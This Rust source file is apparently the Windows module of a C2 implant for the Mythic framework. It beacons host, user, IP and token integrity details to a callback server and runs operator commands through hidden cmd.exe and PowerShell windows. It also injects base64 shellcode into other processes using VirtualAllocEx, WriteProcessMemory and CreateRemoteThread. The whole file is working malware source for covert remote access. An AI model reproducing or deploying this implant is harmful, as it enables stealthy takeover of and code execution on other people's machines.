use link_common::dispatch::dispatch_common;
use std::env;
use std::process::Command;

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USERNAME")
        .or_else(|_| env::var("USER"))
        .unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    env::var("COMPUTERNAME")
        .or_else(|_| env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    link_common::run_c2_loop(
        crate::CALLBACK,
        crate::IMPLANT_SECRET,
        crate::PAYLOAD_UUID,
        crate::CALLBACK_URI,
        link_common::RegisterInfo {
            user: username(),
            host: hostname(),
            ip: local_ip(),
            os: "windows",
            arch: std::env::consts::ARCH,
            pid: std::process::id(),
            integrity_level: get_integrity_level_int(),
        },
        dispatch,
    );
}

/// Convert the text integrity level to the integer Mythic expects.
fn get_integrity_level_int() -> u8 {
    match integrity_level().as_str() {
        "Medium" => 2,
        "High" => 3,
        "System" => 4,
        _ => 2,
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(command: &str, parameters: &str) -> String {
    if let Some(output) = dispatch_common(command, parameters) {
        return output;
    }

    match command {
        "whoami" => format!("{}\\{}", hostname(), username()),
        "info" => collect_system_info(),
        "ps" => list_processes(),
        "netstat" => list_network_connections(),
        "integrity" => integrity_level(),
        "inject" => inject_cmd(parameters),
        "cmd" => shell_exec("cmd.exe", &["/C", parameters]),
        "powershell" => shell_exec(
            "powershell.exe",
            &["-noP", "-sta", "-w", "1", "-c", parameters],
        ),
        "shell" => shell_exec("cmd.exe", &["/C", parameters]),
        _ => shell_exec("cmd.exe", &["/C", parameters]),
    }
}

// ── Process execution ─────────────────────────────────────────────────────────

fn shell_exec(prog: &str, args: &[&str]) -> String {
    let mut cmd = Command::new(prog);
    cmd.args(args);

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000);
    }

    match cmd.output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

fn silent_command(prog: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(prog);
    cmd.args(args);
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000);
    }
    cmd
}

// ── System information ────────────────────────────────────────────────────────

fn collect_system_info() -> String {
    let mut info = Vec::new();

    info.push(format!("OS Version: {}", env::consts::OS));
    info.push(format!("Architecture: {}", env::consts::ARCH));
    info.push(format!("User: {}\\{}", hostname(), username()));
    info.push("Network: Multiple interfaces (use ipconfig for details)".to_string());
    info.push("RAM: Use Task Manager for detailed memory info".to_string());
    info.push(format!("CPU Cores: {}", num_cpus::get()));

    let mut uptime_cmd = silent_command(
        "powershell.exe",
        &[
            "-noP",
            "-sta",
            "-w",
            "1",
            "-c",
            "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime \
                | Select-Object -ExpandProperty TotalSeconds",
        ],
    );
    if let Ok(out) = uptime_cmd.output() {
        if let Ok(s) = String::from_utf8(out.stdout) {
            if let Ok(secs) = s.trim().parse::<f64>() {
                let h = (secs / 3600.0) as u64;
                let m = ((secs % 3600.0) / 60.0) as u64;
                info.push(format!("Uptime: {}h {}m", h, m));
            }
        }
    }

    info.push(format!("Process ID: {}", std::process::id()));

    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("Working Directory: {}", cwd.display()));
    }

    info.push(format!(
        "Environment Variables: {}",
        std::env::vars().count()
    ));

    info.join("\n")
}

fn list_processes() -> String {
    let output = match silent_command("tasklist", &["/FO", "CSV", "/NH"]).output() {
        Ok(o) => o,
        Err(e) => return format!("[-] Failed to execute tasklist: {}", e),
    };

    if !output.status.success() {
        return "[-] tasklist command failed".to_string();
    }

    let output_str = String::from_utf8_lossy(&output.stdout);
    format!(
        "Name\tPID\tSession\tSession#\tMem Usage\n{}",
        output_str.replace(',', "\t")
    )
}

fn list_network_connections() -> String {
    let output = match silent_command("netstat", &["-ano"]).output() {
        Ok(o) => o,
        Err(e) => return format!("[-] Failed to execute netstat: {}", e),
    };

    if !output.status.success() {
        return "[-] netstat command failed".to_string();
    }

    String::from_utf8_lossy(&output.stdout).into_owned()
}

// ── Token integrity level (Windows only) ────────────────────────────────────

#[cfg(target_os = "windows")]
fn integrity_level() -> String {
    use windows::{Win32::Foundation::*, Win32::Security::*, Win32::System::Threading::*};

    const LOW: u32 = 0x1000;
    const MEDIUM: u32 = 0x2000;
    const HIGH: u32 = 0x3000;
    const SYSTEM: u32 = 0x4000;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
            return "unknown".into();
        }

        let mut size: u32 = 0;
        let _ = GetTokenInformation(token, TokenIntegrityLevel, None, 0, &mut size);
        let mut buf = vec![0u8; size as usize];

        if GetTokenInformation(
            token,
            TokenIntegrityLevel,
            Some(buf.as_mut_ptr().cast()),
            size,
            &mut size,
        )
        .is_err()
        {
            let _ = CloseHandle(token);
            return "unknown".into();
        }
        let _ = CloseHandle(token);

        let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
        let sid = label.Label.Sid;
        let count = *GetSidSubAuthorityCount(sid) as isize;
        let rid = *GetSidSubAuthority(sid, count as u32 - 1);

        match rid {
            r if r < LOW => "Untrusted",
            r if r < MEDIUM => "Low",
            r if r < HIGH => "Medium",
            r if r < SYSTEM => "High",
            _ => "System",
        }
        .to_string()
    }
}

#[cfg(not(target_os = "windows"))]
fn integrity_level() -> String {
    "N/A".into()
}

// ── Process injection (Windows only) ────────────────────────────────────────

fn inject_cmd(args: &str) -> String {
    let (pid_str, b64) = link_common::split_first(args);
    if b64.is_empty() {
        return "Usage: inject <pid> <base64_shellcode>".into();
    }
    let pid: u32 = match pid_str.parse() {
        Ok(p) => p,
        Err(_) => return "Usage: inject <pid> <base64_shellcode>".into(),
    };
    use base64::{engine::general_purpose, Engine};
    match general_purpose::STANDARD.decode(b64) {
        Ok(sc) => inject_shellcode(pid, &sc),
        Err(e) => format!("[-] base64 decode: {}", e),
    }
}

#[cfg(target_os = "windows")]
fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
    use winapi::um::memoryapi::WriteProcessMemory;
    use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};

    unsafe {
        let proc = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(handle) => handle,
            Err(_) => return format!("[-] OpenProcess({}) failed", pid),
        };
        if proc.is_invalid() {
            return format!("[-] OpenProcess({}) failed", pid);
        }

        let addr = VirtualAllocEx(
            proc,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            let _ = CloseHandle(proc);
            return "[-] VirtualAllocEx failed".into();
        }

        let mut written = 0usize;
        let _ = WriteProcessMemory(
            proc.0 as *mut winapi::ctypes::c_void,
            addr as *mut winapi::ctypes::c_void,
            shellcode.as_ptr() as *const winapi::ctypes::c_void,
            shellcode.len(),
            &mut written,
        );

        let mut old = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

        let thr = match CreateRemoteThread(
            proc,
            None,
            0,
            Some(std::mem::transmute(addr)),
            None,
            0,
            None,
        ) {
            Ok(handle) => handle,
            Err(_) => {
                let _ = CloseHandle(proc);
                return "[-] CreateRemoteThread failed".into();
            }
        };
        if thr.is_invalid() {
            let _ = CloseHandle(proc);
            return "[-] CreateRemoteThread failed".into();
        }

        let _ = CloseHandle(thr);
        let _ = CloseHandle(proc);
        format!("[+] Injected {} bytes into PID {}", shellcode.len(), pid)
    }
}

#[cfg(not(target_os = "windows"))]
fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
    format!(
        "[-] Process injection only available on Windows (pid={}, sc_len={})",
        pid,
        shellcode.len()
    )
}
